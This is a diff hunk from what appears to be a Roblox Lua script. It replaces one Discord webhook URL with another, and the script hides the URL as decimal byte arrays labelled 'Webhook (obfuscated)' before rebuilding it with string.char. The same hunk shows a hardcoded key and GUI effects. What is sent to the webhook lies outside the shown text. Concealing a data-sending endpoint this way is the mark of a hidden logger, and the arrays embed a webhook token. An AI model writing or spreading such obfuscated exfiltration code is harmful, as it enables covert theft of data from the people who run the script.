@@ -37,16 +37,20 @@ local expiredKey = "uglyisbest"
 -- 🌐 Webhook (obfuscated)
 local a1 = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47}
 local a2 = {97,112,105,47,119,101,98,104,111,111,107,115,47}
-local a3 = {49,51,55,49,50,52,53,52,51,52,52,55,57,51,49,54,57,57,51}
-local a4 = {47,51,106,102,57,48,121,51,72,107,97,65,111,78,86,52,83,117,122,69}
-local a5 = {116,90,67,79,84,56,51,54,115,106,48,80,117,109,98,106,115,54,89,74}
-local a6 = {88,80,88,54,116,56,119,79,77,118,95,53,67,85,84,110,102,80,52,77}
-local a7 = {72,68,71,50,45,52,103,118,98}
+local a3 = {49,51,55,52,54,50,52,48,56,57,57,48,49,49,48,57,50,54,56}
+local a4 = {47,66,120,81,114,45,118,49,105,55,81,90,107,108,99,55,76,71,101,88}
+local a5 = {121,110,52,86,99,77,75,72,101,102,48,57,53,112,103,106,116,107,78,74}
+local a6 = {99,108,116,115,122,65,70,65,101,116,84,55,109,109,106,107,72,100,99,121}
+local a7 = {120,77,56,111,86,86,76,120,120}
 
-local endpoint = string.char(unpack(a1)) .. string.char(unpack(a2)) ..
-                 string.char(unpack(a3)) .. string.char(unpack(a4)) ..
-                 string.char(unpack(a5)) .. string.char(unpack(a6)) ..
+local endpoint = string.char(unpack(a1)) ..
+                 string.char(unpack(a2)) ..
+                 string.char(unpack(a3)) ..
+                 string.char(unpack(a4)) ..
+                 string.char(unpack(a5)) ..
+                 string.char(unpack(a6)) ..
                  string.char(unpack(a7))
+
 
 -- 🌫️ Blur + GUI + Music
 local blur = Instance.new("BlurEffect", game:GetService("Lighting"))
